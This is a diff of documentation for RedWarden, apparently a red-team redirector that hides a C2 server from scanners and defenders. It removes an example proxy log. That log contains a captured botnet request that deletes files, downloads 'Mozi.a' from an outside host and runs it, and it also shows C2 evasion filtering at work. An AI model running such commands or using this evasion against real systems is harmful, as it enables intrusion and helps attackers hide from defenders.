@@ -332,7 +332,7 @@ The above output contains a line pointing out that there has been an unauthorize
 ```
 
 
-### Example output
+### Example outputs
 
 Let's take a look at the output the proxy produces.
 
@@ -402,80 +402,6 @@ policy:
 
 
 By default all of these checks are enforced.
-
-Here is the example output from running the proxy - showing how requests gets dropped and allowed:
-
-```
-[INFO] 2021-04-24/16:37:13: Loading 1 plugin...
-[INFO] 2021-04-24/16:37:13: Plugin "malleable_redirector" has been installed.
-[INFO] 2021-04-24/16:37:13: Preparing SSL certificates and keys for https traffic interception...
-[INFO] 2021-04-24/16:37:13: Using provided CA key file: /etc/letsencrypt/live/attacker.com/privkey.pem
-[INFO] 2021-04-24/16:37:13: Using provided CA certificate file: /etc/letsencrypt/live/attacker.com/fullchain.pem
-[INFO] 2021-04-24/16:37:13: Using provided Certificate key: /home/mariusz/devel/Penetration-Testing-Tools/red-teaming/malleable_redirector/proxy2/ca-cert/cert.key
-[INFO] 2021-04-24/16:37:13: Teeing stdout output to /home/mariusz/work/santa-soc-21/proxy2.log log file.
-[INFO] 2021-04-24/16:37:13: Collected 3 proxy-pass statements:
-        Rule 0. Proxy requests with URL: "^/foobar\d*$" to host bing.com
-        Rule 1. Proxy requests with URL: "^/myip$" to target URL http://ip-api.com/json/
-        Rule 2. Proxy requests with URL: "^/alwayspass$" to host google.com (options: nodrop)
-[INFO] 2021-04-24/16:37:13: Loaded 1890 blacklisted CIDRs.
-[INFO] 2021-04-24/16:37:13: Serving proxy on: http://0.0.0.0:80 ...
-[INFO] 2021-04-24/16:37:13: Serving proxy on: https://0.0.0.0:443 ...
-[INFO] 2021-04-24/16:48:28: [REQUEST] GET /
-[ERROR] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, reason:1, 128.14.211.186] inbound User-Agent differs from the one defined in C2 profile.
-[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:28, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
-[ERROR] 2021-04-24/16:48:29: [REDIRECTING invalid request from 128.14.211.186 (zl-dal-us-gp3-wk107.internet-census.org)] GET /
-[INFO] 2021-04-24/16:48:29: [DROP, 2021-04-24/18:48:29, 128.14.211.186] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
-[INFO] 2021-04-24/16:48:29: [RESPONSE] HTTP 301 Moved Permanently, length: 183
-[INFO] 2021-04-24/16:59:56: [REQUEST] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-[ERROR] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, reason:1, 59.99.140.76] inbound User-Agent differs from the one defined in C2 profile.
-[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:56, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
-[ERROR] 2021-04-24/16:59:57: [REDIRECTING invalid request from 59.99.140.76] GET /shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
-[INFO] 2021-04-24/16:59:57: [DROP, 2021-04-24/18:59:57, 59.99.140.76] "/shell?cd+/tmp;rm+-rf+*;wget+http://59.99.140.76:58283/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" - UA: "Hello, world"
-[INFO] 2021-04-24/16:59:57: [RESPONSE] HTTP 301 Moved Permanently, length: 212
-[INFO] 2021-04-24/17:02:50: [REQUEST] GET /
-[ERROR] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
-[INFO] 2021-04-24/17:02:50: Here is what we know about that address (94.127.104.226): ({'organization': ['', 'INEA SA', 'AS13110 INEA S.A.'], 'continent': 'Europe', 'continent_code': 'EU', 'country': 'Poland', 'country_code': 'PL', 'ip
-[INFO] 2021-04-24/17:02:50: [DROP, 2021-04-24/19:02:50, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
-[ERROR] 2021-04-24/17:02:58: [REDIRECTING invalid request from 94.127.104.226 (d104-226.icpnet.pl)] GET /
-[ERROR] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, reason:4a, 94.127.104.226] Peer's IP address is blacklisted: (94.0.0.0/8 - OtherVThosts)
-[INFO] 2021-04-24/17:02:58: [DROP, 2021-04-24/19:02:58, 94.127.104.226] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
-[INFO] 2021-04-24/17:02:58: [RESPONSE] HTTP 301 Moved Permanently, length: 212
-[INFO] 2021-04-24/17:03:26: [REQUEST] GET /
-[ERROR] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, reason:1, 128.14.211.190] inbound User-Agent differs from the one defined in C2 profile.
-[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
-[ERROR] 2021-04-24/17:03:26: [REDIRECTING invalid request from 128.14.211.190 (zl-dal-us-gp3-wk108.internet-census.org)] GET /
-[INFO] 2021-04-24/17:03:26: [DROP, 2021-04-24/19:03:26, 128.14.211.190] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
-[INFO] 2021-04-24/17:03:26: [RESPONSE] HTTP 301 Moved Permanently, length: 183
-[INFO] 2021-04-24/17:10:18: [REQUEST] GET /
-[ERROR] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, reason:1, 51.254.59.114] inbound User-Agent differs from the one defined in C2 profile.
-[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:18, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
-[ERROR] 2021-04-24/17:10:19: [REDIRECTING invalid request from 51.254.59.114 (scan019.intrinsec.com)] GET /
-[INFO] 2021-04-24/17:10:19: [DROP, 2021-04-24/19:10:19, 51.254.59.114] "/" - UA: "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
-[INFO] 2021-04-24/17:10:19: [RESPONSE] HTTP 301 Moved Permanently, length: 212
-[INFO] 2021-04-24/17:14:32: [REQUEST] GET /
-[ERROR] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, reason:1, 45.83.67.59] inbound User-Agent differs from the one defined in C2 profile.
-[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:32, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
-[ERROR] 2021-04-24/17:14:33: [REDIRECTING invalid request from 45.83.67.59] GET /
-[INFO] 2021-04-24/17:14:33: [DROP, 2021-04-24/19:14:33, 45.83.67.59] "/" - UA: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0"
-[INFO] 2021-04-24/17:14:33: [RESPONSE] HTTP 301 Moved Permanently, length: 183
-[INFO] 2021-04-24/17:30:09: [REQUEST] GET /js/scripts.js
-[INFO] 2021-04-24/17:30:17: == Valid malleable http-get (variant: default) request inbound.
-[INFO] 2021-04-24/17:30:17: Here is what we know about that address (111.222.223.224): ({'organization': ['Santander Bank Polska S.A', 'Santander Bank Polska S.A.', 'AS59977 Santander Bank Polska S.A.'], 'continent': 'Europe', 'continent
-[INFO] 2021-04-24/17:30:17: [ALLOW, 2021-04-24/19:30:09, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-[INFO] 2021-04-24/17:30:17: Connected peer sent 1 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
-[INFO] 2021-04-24/17:30:17: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
-[INFO] 2021-04-24/17:30:18: [ALLOW, 2021-04-24/19:30:18, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-[INFO] 2021-04-24/17:30:18: [RESPONSE] HTTP 200 OK, length: 1828
-[INFO] 2021-04-24/17:30:48: [REQUEST] GET /js/scripts.js
-[INFO] 2021-04-24/17:30:48: == Valid malleable http-get (variant: default) request inbound.
-[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-[INFO] 2021-04-24/17:30:48: Connected peer sent 2 valid http-get and 0 valid http-post requests so far, out of 15/5 required to consider him temporarily trusted
-[INFO] 2021-04-24/17:30:48: Plugin redirected request from [attacker.com] to [127.0.0.1:5555]
-[INFO] 2021-04-24/17:30:48: [ALLOW, 2021-04-24/19:30:48, 111.222.223.224] "/js/scripts.js" - UA: "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
-[INFO] 2021-04-24/17:30:48: [RESPONSE] HTTP 200 OK, length: 202937
-[INFO] 2021-04-24/17:30:49: [REQUEST] POST /fonts/KFOmCnqEu92Fr1Mu4mxK.woff2
-[INFO] 2021-04-24/17:30:49: == Valid malleable http-post (variant: default) request inbound.
-```
 
 Turning `debug: True` will swamp your console buffer with plenty of log lines describing each step RedWarden takes in its complex decisioning process. 
 If you want to see your requests and responses full bodies - set `debug` and `trace` to true and get buried in logging burden!
